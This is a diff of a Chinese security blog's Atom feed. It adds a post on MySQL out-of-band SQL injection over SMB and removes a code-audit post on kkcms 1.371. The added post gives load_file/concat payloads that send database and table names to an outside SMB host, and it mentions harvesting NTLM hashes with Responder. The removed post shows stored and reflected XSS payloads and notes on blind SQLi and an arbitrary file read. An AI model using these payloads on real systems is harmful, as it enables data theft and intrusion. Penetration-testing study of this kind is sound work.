@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-06-19T17:55:09.539Z</updated>
+  <updated>2021-06-29T14:27:51.737Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>mysql smb外带注入</title>
+    <link href="http://422926799.github.io/posts/af61cc76.html"/>
+    <id>http://422926799.github.io/posts/af61cc76.html</id>
+    <published>2021-06-29T14:19:23.000Z</published>
+    <updated>2021-06-29T14:27:51.737Z</updated>
+    
+    <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;需求：secure_file_priv为空，目标系统为windows&lt;br&gt;smb设置如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：
+map to guest = Bad </summary>
+      
+    
+    
+    
+    
+    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
+    
+  </entry>
   
   <entry>
     <title>LastConn 样本简陋分析</title>
@@ -426,29 +450,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;漏洞发生于：2021年/4月1号&lt;br&gt;漏洞点：application\api\controller\Common.php&lt;br&gt;触发漏洞的</summary>
-      
-    
-    
-    
-    
-    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>kkcms1.371代码审计</title>
-    <link href="http://422926799.github.io/posts/de5a64f.html"/>
-    <id>http://422926799.github.io/posts/de5a64f.html</id>
-    <published>2021-03-30T16:49:39.000Z</published>
-    <updated>2021-03-30T17:55:14.844Z</updated>
-    
-    <content type="html"><![CDATA[<p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p><h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p><ul><li>library.php 处理函数和单双引号转义处理</li><li>inc.php 引用了system目录里的所有文件</li></ul><h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p><p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p><p>可以看到，对所有的请求对单双引号进行了转义</p><pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {    exit(&#39;Request Error!&#39;);}if (!get_magic_quotes_gpc()) {    if (!empty($_GET)) {        $_GET = addslashes_deep($_GET);    }    if (!empty($_POST)) {        $_POST = addslashes_deep($_POST);    }    $_COOKIE = addslashes_deep($_COOKIE);    $_REQUEST = addslashes_deep($_REQUEST);}</code></pre><p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p><p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p><p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p><p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p><p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p><p>貌似payload并不会因为addslashes_deep函数而失效</p><p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p><p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p><p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p><p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p><p>留言板和这个差不多一致，省略</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p><h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p><p>总的来说，这套CMS有点水</p><p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的&lt;br&gt;but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询&lt;/p&gt;
-&lt;h2 id=&quot;预处理分析&quot;&gt;&lt;a href=&quot;#预处理分析&quot; class=&quot;heade</summary>
       
     
     
